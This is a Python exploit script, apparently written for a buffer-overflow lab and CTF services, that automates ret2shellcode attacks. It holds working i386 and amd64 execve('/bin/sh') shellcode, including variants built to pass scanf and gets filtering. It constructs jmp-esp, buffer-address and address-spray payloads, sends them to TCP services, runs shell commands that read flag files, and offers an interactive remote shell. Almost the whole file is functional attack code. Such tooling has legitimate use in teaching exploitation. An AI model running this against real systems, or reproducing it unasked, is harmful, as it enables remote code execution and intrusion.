#!/usr/bin/env python3
"""ret2shellcode (Lab 10 "Buffer Overflow - 2 (Injecting code)") for stdin/TCP services.

Two layouts, both from the lab:
  jmp-esp   :  A*offset + p(jmp_esp) + NOP sled + shellcode        (Echo32 style; no stack addr needed)
  buf-addr  :  NOP sled + shellcode + pad-to-offset + p(buf_addr)  (classic; needs buffer address:
               printed by the service, or ASLR off)

Built-in NUL-free execve("/bin/sh") shellcode for i386 (23 B) and amd64 (27 B); or --shellcode-file.
After the payload the script talks to the shell: runs --cmd (default: id + cat likely flag files),
then optionally --interactive.

Usage:
  python3 ret2shell.py --binary ./echo32 --host H --port P                   # auto offset + jmp esp
  python3 ret2shell.py --binary ./echo32 --host H --port P --shift=-16       # remote build shifted (note the =)
  python3 ret2shell.py --host H --port P --offset 132 --jmp 0x08049186 --arch i386
  python3 ret2shell.py --host H --port P --offset 40 --buf-addr 0x7ffd... --arch amd64
  python3 ret2shell.py --host H --port P --offset 40 --buf-regex 'buffer: (0x[0-9a-f]+)' --arch amd64
  python3 ret2shell.py --binary ./echo32 --local                              # test against local binary
  ... --dry-run

Authorised classroom/CTF use only.
"""
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from elftool import ELF, fmt_addr
except Exception:
    ELF = None

# execve("/bin///sh", ["sh"], NULL) - sets EVERY register explicitly (ebx/ecx/edx, rdi/rsi/rdx).
# Lesson from Echo32: the classic 23-byte i386 shellcode leaves edx (envp) untouched; it worked
# locally (edx happened to be 0) and silently died on the server (edx garbage -> execve EFAULT).
# No NUL bytes; the i386 one has no 0x0a either, so it survives gets()/fgets() too.
SHELLCODE = {
    32: bytes.fromhex("6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"),
    64: bytes.fromhex("6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"),
}
SHELLCODE_LEGACY_32 = bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")  # lab-style, edx not set
# execve("/bin//sh") with NO byte that scanf("%s") treats as whitespace. The usual
# `mov al, 0xb` / `push 0xb` carries 0x0b (vertical tab), and scanf stops right there, so
# the textbook shellcode is cut in half. Here: mov al, 0x1b ; sub al, 0x10.
SHELLCODE_NOWS_32 = bytes.fromhex("31c050682f2f7368682f62696e89e3505389e131d2b01b2c10cd80")
LINE_SINKS = ("scanf", "gets", "fgets")
DEFAULT_CMD = ("echo ===SHELL===; id; cat /home/*/flag* /flag* /flag.txt /root/flag* flag* 2>/dev/null; "
               "find / -maxdepth 3 -iname '*flag*' 2>/dev/null | head")


def recv_idle(sock, timeout=2.0, idle=0.4):
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            d = sock.recv(4096)
            if not d:
                break
            out += d
            sock.settimeout(idle)
        except socket.timeout:
            break
        except OSError:
            break
    return out


class Local:
    """Run the binary locally (stdin/stdout pipes) so payloads can be tested offline."""
    def __init__(self, path):
        self.pr = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT, bufsize=0)

    def sendall(self, b):
        self.pr.stdin.write(b)
        self.pr.stdin.flush()

    def recv_idle(self, timeout=1.0, idle=0.3):
        out, end, fd = b"", time.time() + timeout, self.pr.stdout.fileno()
        while time.time() < end:
            r, _, _ = select.select([fd], [], [], idle)
            if not r:
                if out:
                    break
                continue
            d = os.read(fd, 4096)
            if not d:
                break
            out += d
            end = time.time() + idle
        return out

    def close(self):
        try:
            self.pr.kill()
        except Exception:
            pass


def stack_addr_in(banner, bits, elf=None):
    """First hex value in the banner that can only be a stack address: above every
    mapping of the binary, in the range the kernel gives the stack (0xff../0xbf.. on
    32-bit, 0x7ff.. on 64-bit). libc on 32-bit lives at 0xf7.., which is excluded."""
    spans = []
    if elf is not None:
        spans = [(s["addr"], s["addr"] + max(s.get("size") or 0, 1)) for s in elf.sections if s.get("addr")]
    for m in re.finditer(rb"0x([0-9a-fA-F]{6,16})", banner or b""):
        v = int(m.group(1), 16)
        if any(lo <= v < hi for lo, hi in spans):
            continue
        if bits == 32 and (0xFF000000 <= v <= 0xFFFFFFFF or 0xBF000000 <= v <= 0xBFFFFFFF):
            return v
        if bits == 64 and 0x7FF000000000 <= v <= 0x7FFFFFFFFFFF:
            return v
    return None


def build(args, bits, shellcode):
    p = (lambda x: struct.pack("<I", x)) if bits == 32 else (lambda x: struct.pack("<Q", x))
    nops = b"\x90" * args.nop
    if args.jmp is not None:
        return b"A" * args.offset + p(args.jmp) + nops + shellcode, "jmp-esp"
    if args.buf_addr is not None:
        body = nops + shellcode
        word = 4 if bits == 32 else 8
        if len(body) > args.offset or getattr(args, "after", False):
            # The buffer is too small to hold the shellcode (or the first layout failed):
            # put the sled AFTER the return address and return to just past it. The
            # address is still derived from the same leaked buffer start.
            return (b"A" * args.offset + p(args.buf_addr + args.offset + word) + nops + shellcode,
                    "buf-addr, shellcode after the return address")
        body += b"A" * (args.offset - len(body))
        return body + p(args.buf_addr), "buf-addr"
    sys.exit("[!] need --jmp (jmp esp/rsp gadget) or --buf-addr/--buf-regex (stack address)")


def spray_main(args):
    """No binary, no offset: the service prints a stack address and that is all there is.

    The lab's layout needs the offset to the return address. This one does not: the return
    address is REPEATED over the first part of the input - wherever the saved return
    address is, it now holds it - and it points past the repeats into a NOP sled, with the
    shellcode at the end. Word size comes from the width of the printed pointer."""
    for attempt in range(4):
        conn = socket.create_connection((args.host, args.port), timeout=args.timeout)
        try:
            banner = recv_idle(conn, args.timeout, 0.5)
            try:
                from auto_pwn import answer_gate, pass_gates
                import types as _t
                if banner and answer_gate(banner) is not None:
                    banner, _tf = pass_gates(conn, _t.SimpleNamespace(timeout=args.timeout, idle=0.4,
                                                                      gate_delay=0.25), banner)
            except Exception as exc:                    # noqa: BLE001
                print(f"[!] BUG while answering a gate: {type(exc).__name__}: {exc}")
            for line in (args.pre or []):
                conn.sendall(line.encode("latin-1", "replace") + b"\n")
                time.sleep(0.15)
                banner += recv_idle(conn, min(args.timeout, 1.5), 0.4)
            addr, bits = None, None
            for b in ((32, 64) if not args.arch else ((32,) if args.arch == "i386" else (64,))):
                addr = stack_addr_in(banner, b)
                if addr is not None:
                    bits = b
                    break
            if addr is None:
                print("[!] --spray needs a stack address printed by the service (none in the banner)")
                return 1
            word = bits // 8
            reps, sled = args.spray_words, 200
            target = addr + reps * word + sled // 3      # inside the sled, past every repeat
            pk = struct.pack("<I" if bits == 32 else "<Q", target)
            payload = pk * reps + b"\x90" * sled + SHELLCODE[bits]
            if b"\n" in payload:
                print(f"[*] {hex(target)} contains a newline byte this time; reconnecting "
                      f"(the stack moves on every connection)")
                continue
            print(f"[*] {bits}-bit (from the printed pointer's width); buffer at {hex(addr)}")
            print(f"[*] layout=address-spray: {hex(target)} x{reps}, then a {sled}-byte NOP sled and "
                  f"{len(SHELLCODE[bits])}B shellcode - no offset needed")
            if args.dry_run:
                print(f"[dry] payload={payload!r}")
                return 0
            conn.sendall(payload + b"\n")
            time.sleep(0.5)
            pre = recv_idle(conn, 1.0, 0.3)
            if pre:
                sys.stdout.write(pre.decode("latin-1", "replace"))
            from flags import with_proof
            conn.sendall(with_proof(args.cmd).encode() + b"\n")
            time.sleep(0.8)
            txt = recv_idle(conn, 3.0, 0.6).decode("latin-1", "replace")
            sys.stdout.write(txt)
            from flags import shell_confirmed
            ok = shell_confirmed(txt)
            print(f"\n[{'+' if ok else '!'}] shell {'confirmed' if ok else 'NOT confirmed'}")
            if not ok:
                print("    the address spray needs: an executable stack, an unbounded read, and "
                      "the printed address being the buffer the overflow starts in.")
            return 0 if ok else 1
        finally:
            conn.close()
    return 1


def main():
    ap = argparse.ArgumentParser(description="ret2shellcode helper (jmp esp or buffer-address layout)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--binary", help="local ELF: auto arch, offset, jmp esp gadget")
    ap.add_argument("--local", action="store_true", help="run --binary locally instead of connecting")
    ap.add_argument("--arch", choices=["i386", "amd64"])
    ap.add_argument("--offset", type=int, help="filler bytes to the saved return address")
    ap.add_argument("--jmp", help="address of jmp esp / jmp rsp (default: found in --binary)")
    ap.add_argument("--shift", default="0", help="uniform shift of remote build vs local (from verify.py)")
    ap.add_argument("--buf-addr", help="stack address of the buffer (classic layout)")
    ap.add_argument("--buf-regex", help="regex with one group capturing the buffer address from the banner")
    ap.add_argument("--shellcode-file", help="raw shellcode bytes (default: built-in /bin/sh)")
    ap.add_argument("--nop", type=int, default=32, help="NOP sled length (default 32)")
    ap.add_argument("--spray", action="store_true",
                    help="NO binary/offset needed: repeat the return address over the input, "
                         "sled + shellcode after it. Needs a stack address in the banner")
    ap.add_argument("--spray-words", type=int, default=60, help="how many times to repeat it")
    ap.add_argument("--after", action="store_true",
                    help="buffer-address layout with the shellcode AFTER the return address "
                         "(automatic when the buffer is too small to hold it)")
    ap.add_argument("--send-mode", choices=["raw", "line"], default=None,
                    help="line: append \\n (gets/fgets/scanf services). raw: exact bytes (read "
                         "services). Default: derived from the binary's input function")
    ap.add_argument("--cmd", default=DEFAULT_CMD, help="command to run in the shell")
    ap.add_argument("--interactive", action="store_true", help="hand you the shell afterwards")
    ap.add_argument("--pre", action="append", default=[], metavar="LINE",
                    help="line(s) to send before the payload, e.g. a menu option. "
                         "Live arithmetic/nonce gates are answered automatically")
    ap.add_argument("--noreceive", action="store_true", help="service prints no banner")
    ap.add_argument("--timeout", type=float, default=4.0,
                    help="seconds to wait for each reply (raise on a slow/remote target)")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()
    if args.spray:
        return spray_main(args)

    shift = int(args.shift, 0)
    bits = None
    elf = None
    sink_bad, sink_why = b"", ""      # no binary -> nothing known about the input function
    if args.binary:
        if ELF is None:
            sys.exit("[!] elftool.py not importable (keep it next to this script)")
        elf = ELF(args.binary)
        bits = elf.bits
        if elf.pie:
            print("[!] PIE binary: fixed jmp-esp address is unknown; use --buf-addr/--buf-regex")
        try:
            from auto_pwn import auto_badchars
            sink_bad, sink_why = auto_badchars(args.binary)
        except Exception as exc:
            print(f"[!] BUG while reading the sink: {type(exc).__name__}: {exc}")
        if elf.nx:
            print("[!] WARNING: binary says NX ON - shellcode on the stack will not run (use ret2win/ret2libc)")
        if args.offset is None:
            c = elf.report()["ret_offset_candidates"]
            if c:
                args.offset = c[0]
                print(f"[*] offset={args.offset} (frame analysis)")
        if args.jmp is None and args.buf_addr is None and args.buf_regex is None and not elf.pie:
            g = elf.gadgets()
            j = g.get("jmp esp" if bits == 32 else "jmp rsp") or g.get("call esp" if bits == 32 else "call rsp")
            if j:
                # Prefer a gadget whose address bytes the input function will not eat.
                import struct as _st
                ok = [x for x in j if not (set(_st.pack("<I" if bits == 32 else "<Q", x)[:4 if bits == 32 else 6])
                                           & set(sink_bad))]
                args.jmp = hex((ok or j)[0])
                print(f"[*] jmp {'esp' if bits == 32 else 'rsp'} gadget={args.jmp}"
                      + ("" if ok else "  [!] every candidate contains a byte this sink eats"))
    if args.arch:
        bits = 32 if args.arch == "i386" else 64
    if bits is None:
        sys.exit("[!] need --arch or --binary")
    if args.offset is None:
        sys.exit("[!] need --offset (or --binary with a detectable frame)")

    args.jmp = (int(args.jmp, 0) + shift) if args.jmp is not None else None
    args.buf_addr = int(args.buf_addr, 0) if args.buf_addr else None
    if shift and args.jmp is not None:
        print(f"[*] shift {shift:+#x} applied: jmp -> {hex(args.jmp)}")

    # The input function decides both HOW to send and WHICH bytes survive. scanf/gets/fgets
    # need a terminating newline or they never return; read() takes the bytes as they are.
    if args.send_mode is None:
        args.send_mode = "line" if any(k in sink_why for k in LINE_SINKS) else "raw"
        if sink_why:
            print(f"[*] sink is {sink_why}: sending in {args.send_mode} mode")
    eaten = set(sink_bad) | ({0x0A} if args.send_mode == "line" else set())
    if args.shellcode_file:
        with open(args.shellcode_file, "rb") as fh:
            shellcode = fh.read()
    else:
        options = [SHELLCODE[bits]] + ([SHELLCODE_NOWS_32, SHELLCODE_LEGACY_32] if bits == 32 else [])
        clean = [sc for sc in options if not (set(sc) & eaten)]
        shellcode = (clean or options)[0]
        if clean and shellcode is not options[0]:
            print(f"[*] default shellcode contains a byte this sink eats; "
                  f"using the {len(shellcode)}-byte variant without it")
    bad = sorted(set(shellcode) & eaten)
    if bad:
        print(f"[!] shellcode contains byte(s) {' '.join(f'{x:#04x}' for x in bad)} that this input "
              f"function stops at ({args.send_mode} mode) - it WILL be truncated. "
              f"Supply clean shellcode with --shellcode-file.")

    # connect / spawn
    conn = None
    banner = b""
    if not args.dry_run:
        if args.local:
            if not args.binary:
                sys.exit("[!] --local needs --binary")
            conn = Local(args.binary)
        else:
            if not args.port:
                sys.exit("[!] --port required")
            conn = socket.create_connection((args.host, args.port), timeout=args.timeout)
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not args.noreceive:
            banner = conn.recv_idle(1.5) if args.local else recv_idle(conn, args.timeout, 0.5)
            # Walk whatever stands in front of the vulnerable read BEFORE deciding
            # anything from the banner. Behind a gate the half of the banner that matters
            # (a buffer address for --buf-regex, the real prompt) has not been printed, and
            # the payload lands on the gate's own read: the only symptom was
            # "shell NOT confirmed".
            if not args.local:
                try:
                    from auto_pwn import answer_gate, pass_gates
                    import types as _t
                    _a = _t.SimpleNamespace(timeout=args.timeout, idle=0.4, gate_delay=0.25)
                    if banner and answer_gate(banner) is not None:
                        banner, _tf = pass_gates(conn, _a, banner)
                        print("[*] a live gate was answered before sending the payload")
                except Exception as exc:
                    print(f"[!] BUG while answering a gate: {type(exc).__name__}: {exc}")
                for line in (args.pre or []):
                    try:
                        conn.sendall(line.encode("latin-1", "replace") + b"\n")
                    except OSError:
                        break
                    time.sleep(0.15)
                    banner += recv_idle(conn, min(args.timeout, 1.5), 0.4)
            if banner:
                sys.stderr.write(banner.decode("latin-1", "replace"))
        if args.buf_regex:
            m = re.search(args.buf_regex, banner.decode("latin-1", "replace"))
            if not m:
                sys.exit(f"[!] --buf-regex did not match the banner")
            args.buf_addr = int(m.group(1), 16)
            print(f"[*] buffer address from banner: {hex(args.buf_addr)}")
        elif args.jmp is None and args.buf_addr is None:
            # No jmp esp gadget and nothing typed: a service that PRINTS a stack address
            # is handing over the lab's "starting address of the buffer". Take the first
            # value that is a stack pointer for this word size and is not in the binary.
            a = stack_addr_in(banner, bits, elf)
            if a is None:
                # ...or the paper states it ("the buffer starts at 0xffffd0a0")
                try:
                    from auto_pwn import paper
                    told = [x for x in paper("address") if stack_addr_in(b"0x%x" % x, bits) is not None]
                    a = told[0] if told else None
                except Exception:
                    a = None
            if a is not None:
                args.buf_addr = a
                print(f"[*] stack address in the banner: {hex(a)} - using it as the buffer start")

    payload, layout = build(args, bits, shellcode)
    if args.send_mode == "line":
        payload += b"\n"
    print(f"[*] layout={layout} arch={bits} offset={args.offset} len={len(payload)} shellcode={len(shellcode)}B nop={args.nop}")
    if args.dry_run:
        print(f"[dry] payload={payload!r}")
        return 0

    conn.sendall(payload)
    time.sleep(0.5)
    pre = conn.recv_idle(0.8) if args.local else recv_idle(conn, 1.0, 0.3)
    if pre:
        sys.stdout.write(pre.decode("latin-1", "replace"))

    from flags import with_proof
    conn.sendall(with_proof(args.cmd).encode() + b"\n")
    time.sleep(0.8)
    out = conn.recv_idle(2.0) if args.local else recv_idle(conn, 3.0, 0.6)
    txt = out.decode("latin-1", "replace")
    sys.stdout.write(txt)
    from flags import shell_confirmed
    ok = shell_confirmed(txt)
    print(f"\n[{'+' if ok else '!'}] shell {'confirmed' if ok else 'NOT confirmed (no output from cmd)'}")
    if not ok:
        print("    next: verify.py (is the remote build shifted?), check --offset, --send-mode, NX")

    if args.interactive and not args.local:
        print("[*] interactive shell - Ctrl-C to quit")
        try:
            while True:
                line = sys.stdin.readline()
                if not line:
                    break
                conn.sendall(line.encode())
                time.sleep(0.3)
                sys.stdout.write(recv_idle(conn, 1.5, 0.3).decode("latin-1", "replace"))
                sys.stdout.flush()
        except KeyboardInterrupt:
            pass
    conn.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
